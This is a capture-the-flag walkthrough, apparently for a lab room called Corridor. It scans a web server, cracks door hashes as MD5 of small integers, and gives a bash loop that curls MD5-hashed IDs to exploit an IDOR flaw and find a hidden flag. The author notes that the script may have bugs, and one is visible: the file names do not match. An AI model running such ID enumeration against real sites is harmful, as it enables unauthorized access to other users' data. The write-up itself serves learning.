> Corridor

# Nmap

```bash
rustscan $IP --ulimit 5000 -- -sC -sV -A -Pn

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
```

In the webpage, we can view many doors and once we hover over them, we can see some kind of hash. And we can check the source code by hitting [Ctrl + U] or Right Click and View Source Code. In there we can see all the doors endpoints. We can grab all the hashes.

```bash
c4ca4238a0b923820dcc509a6f75849b
c81e728d9d4c2f636f067f89cc14862c
eccbc87e4b5ce2fe28308fd9f2a7baf3
a87ff679a2f3e71d9181a67b7542122c
e4da3b7fbbce2345d7772b0674a318d5
1679091c5a880faf6fb5e6087eb1b2dc
8f14e45fceea167a5a36dedd4bea2543
c9f0f895fb98ab9159f51fd0297e236d
45c48cce2e2d7fbdea1afc51c7c6ad26
d3d9446802a44259755d38e6d163e820
6512bd43d9caa6e02c990b0a82652dca
c20ad4d76fe97759aa27a0c99bff6710
c51ce410c124a10e0db5e4b97fc2af39
```


**Note: If you have an unknown kind of string/hash, try using hash-identifier. And for this we can get MD5 hash.** 

So let's throw all the collected hashes in Crackstation.net and identify them. Looks like all are numbers in ascending order. As from the description of the room, which said that it is an IDOR vulnerability, we can check for similar numbers being the endpoint i.e) their MD5 as the endpoint. For this we can quickly write a python script. But I wanted to learn about bash programming and so I wrote it in bash.
I am a beginner and my coding skills needs much development. So some errors may be present feel free to point out.

First I generated the hashes in bash using `md5sum` and stored it in a file called `generated_hashes`.

```bash
for i in {0..100}; do echo -n $i | md5sum | tr -d "-" | tr -d "\n"; printf "\n"; done > temp
```

And I wrote a script to parse through the file and generate a curl request. Then to check the response status code. If we get a 200 response code, then we can get our flag.

```bash
#!/bin/bash

IP=<Machine-IP>
input="generated_hashes"
while read -r line
do
	if [ $(curl -I http://$IP/$line | head -n 1 | cut -d$' ' -f2) == 200 ]; then
		$(curl http://$IP/$line | grep flag)
	else
		echo "Checking for flag"
	fi
done < "$input"
```

Once we got the new hash, throw it in the URL of format `http://IP/<hash_found>`. From this URL we can get our flag.